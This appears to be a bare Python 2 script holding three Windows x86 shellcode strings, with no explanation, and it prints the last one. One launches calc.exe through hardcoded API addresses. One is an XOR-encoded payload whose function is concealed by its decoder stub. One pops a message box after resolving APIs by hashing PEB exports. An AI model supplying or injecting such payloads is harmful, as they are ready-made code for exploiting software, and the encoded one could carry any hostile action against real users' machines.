shellcode = \
"\x55\x8B\xEC\x33\xC0\x50\x83"\
"\xEC\x09\xC6\x45\xF3\x6B\xC6"\
"\x45\xF4\x65\xC6\x45\xF5\x72"\
"\xC6\x45\xF6\x6E\xC6\x45\xF7"\
"\x65\xC6\x45\xF8\x6C\xC6\x45"\
"\xF9\x33\xC6\x45\xFA\x32\xC6"\
"\x45\xFB\x2E\xC6\x45\xFC\x64"\
"\xC6\x45\xFD\x6C\xC6\x45\xFE"\
"\x6C\x8D\x45\xF3\x50\xB8\x7B"\
"\x1D\x80\x7C\xFF\xD0\x8B\xE5"\
"\x33\xC0\x50\x83\xEC\x08\xC6"\
"\x45\xF4\x63\xC6\x45\xF5\x61"\
"\xC6\x45\xF6\x6C\xC6\x45\xF7"\
"\x63\xC6\x45\xF8\x2E\xC6\x45"\
"\xF9\x65\xC6\x45\xFA\x78\xC6"\
"\x45\xFB\x65\x8D\x45\xF4\x50"\
"\xB8\xAD\x23\x86\x7C\xFF\xD0"\
"\x8B\xE5\x5D"
shellcode2=\
"\x6a\x56\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc9\xa3"\
"\xaa\xe0\x83\xeb\xfc\xe2\xf4\x35\x4b\x23\xe0\xc9\xa3\xca\x69"\
"\x2c\x92\x78\x84\x42\xf1\x9a\x6b\x9b\xaf\x21\xb2\xdd\x28\xd8"\
"\xc8\xc6\x14\xe0\xc6\xf8\x5c\x9b\x20\x65\x9f\xcb\x9c\xcb\x8f"\
"\x8a\x21\x06\xae\xab\x27\x2b\x53\xf8\xb7\x42\xf1\xba\x6b\x8b"\
"\x9f\xab\x30\x42\xe3\xd2\x65\x09\xd7\xe0\xe1\x19\xf3\x21\xa8"\
"\xd1\x28\xf2\xc0\xc8\x70\x49\xdc\x80\x28\x9e\x6b\xc8\x75\x9b"\
"\x1f\xf8\x63\x06\x21\x06\xae\xab\x27\xf1\x43\xdf\x14\xca\xde"\
"\x52\xdb\xb4\x87\xdf\x02\x91\x28\xf2\xc4\xc8\x70\xcc\x6b\xc5"\
"\xe8\x21\xb8\xd5\xa2\x79\x6b\xcd\x28\xab\x30\x40\xe7\x8e\xc4"\
"\x92\xf8\xcb\xb9\x93\xf2\x55\x00\x91\xfc\xf0\x6b\xdb\x48\x2c"\
"\xbd\xa1\x90\x98\xe0\xc9\xcb\xdd\x93\xfb\xfc\xfe\x88\x85\xd4"\
"\x8c\xe7\x36\x76\x12\x70\xc8\xa3\xaa\xc9\x0d\xf7\xfa\x88\xe0"\
"\x23\xc1\xe0\x36\x76\xfa\xb0\x99\xf3\xea\xb0\x89\xf3\xc2\x0a"\
"\xc6\x7c\x4a\x1f\x1c\x2a\x6d\xd1\x12\xf0\xc2\xe2\xc9\xb2\xf6"\
"\x69\x2f\xc9\xba\xb6\x9e\xcb\x68\x3b\xfe\xc4\x55\x35\x9a\xf4"\
"\xc2\x57\x20\x9b\x55\x1f\x1c\xf0\xf9\xb7\xa1\xd7\x46\xdb\x28"\
"\x5c\x7f\xb7\x40\x64\xc2\x95\xa7\xee\xcb\x1f\x1c\xcb\xc9\x8d"\
"\xad\xa3\x23\x03\x9e\xf4\xfd\xd1\x3f\xc9\xb8\xb9\x9f\x41\x57"\
"\x86\x0e\xe7\x8e\xdc\xc8\xa2\x27\xa4\xed\xb3\x6c\xe0\x8d\xf7"\
"\xfa\xb6\x9f\xf5\xec\xb6\x87\xf5\xfc\xb3\x9f\xcb\xd3\x2c\xf6"\
"\x25\x55\x35\x40\x43\xe4\xb6\x8f\x5c\x9a\x88\xc1\x24\xb7\x80"\
"\x36\x76\x11\x10\x7c\x01\xfc\x88\x6f\x36\x17\x7d\x36\x76\x96"\
"\xe6\xb5\xa9\x2a\x1b\x29\xd6\xaf\x5b\x8e\xb0\xd8\x8f\xa3\xa3"\
"\xf9\x1f\x1c\xa3\xaa\xe0"
shellcode3=\
"\xE8\x00\x00\x00\x00\x5F\x81\xEF\x1E\x10\x40\x00\x8D\x87\x94\x10"\
"\x40\x00\x50\xE8\x83\x00\x00\x00\x8D\x87\xA5\x10\x40\x00\x50\xE8"\
"\x77\x00\x00\x00\x2B\xC0\x50\x8D\x9F\x83\x10\x40\x00\x53\x8D\x9F"\
"\x5E\x10\x40\x00\x53\x50\xFF\x97\xAC\x10\x40\x00\x6A\x00\xFF\x97"\
"\x9D\x10\x40\x00\xC3\x5B\x2A\x5D\x20\x48\x65\x6C\x6C\x6F\x20\x57"\
"\x6F\x72\x6C\x64\x20\x43\x6F\x64\x65\x72\x21\x20\x28\x43\x29\x20"\
"\x41\x6E\x73\x6B\x79\x61\x2E\x0D\x0A\x00\x4D\x73\x67\x42\x6F\x78"\
"\x20\x42\x79\x20\x41\x6E\x73\x6B\x79\x61\x00\x6B\x65\x72\x6E\x65"\
"\x6C\x33\x32\x00\x01\x92\x8F\x05\x00\x00\x00\x00\x75\x73\x65\x72"\
"\x33\x32\x00\xF7\x6C\x55\xD8\x00\x00\x00\x00\x60\x8B\x74\x24\x24"\
"\xE8\x97\x00\x00\x00\x68\xAD\xD1\x34\x41\x50\xE8\x1F\x00\x00\x00"\
"\x56\xFF\xD0\x8B\xD8\x2B\xC0\xAC\x84\xC0\x75\xFB\x8B\xFE\xAD\x85"\
"\xC0\x74\x0A\x50\x53\xE8\x05\x00\x00\x00\xAB\xEB\xF1\x61\xC3\x60"\
"\x8B\x5C\x24\x24\x8B\x74\x24\x28\x2B\xED\x8B\xD3\x03\x52\x3C\x8B"\
"\x52\x78\x03\xD3\x8B\x42\x18\x8B\x7A\x1C\x03\xFB\x8B\x7A\x20\x03"\
"\xFB\x52\x8B\xD7\x8B\x17\x03\xD3\x45\x60\x8B\xF2\x2B\xC9\xAC\x41"\
"\x84\xC0\x75\xFA\x89\x4C\x24\x18\x61\x60\x2B\xC0\xE8\x51\x00\x00"\
"\x00\x3B\xC6\x61\x74\x08\x83\xC7\x04\x48\x74\x18\xEB\xD6\x5A\x4D"\
"\x8B\x4A\x24\x03\xCB\x0F\xB7\x04\x69\x8B\x6A\x1C\x03\xEB\x8B\x44"\
"\x85\x00\x03\xC3\x89\x44\x24\x1C\x61\xC2\x08\x00\x60\x2B\xC0\x64"\
"\x8B\x40\x30\x85\xC0\x78\x0C\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B\x40"\
"\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C\x8B\x40\x3C\x89\x44\x24\x1C"\
"\x61\xC3\x60\xE3\x18\xF7\xD0\x32\x02\x42\xB3\x08\xD1\xE8\x73\x05"\
"\x35\x20\x83\xB8\xED\xFE\xCB\x75\xF3\xE2\xEC\xF7\xD0\x89\x44\x24"\
"\x1C\x61\xC3"
print shellcode3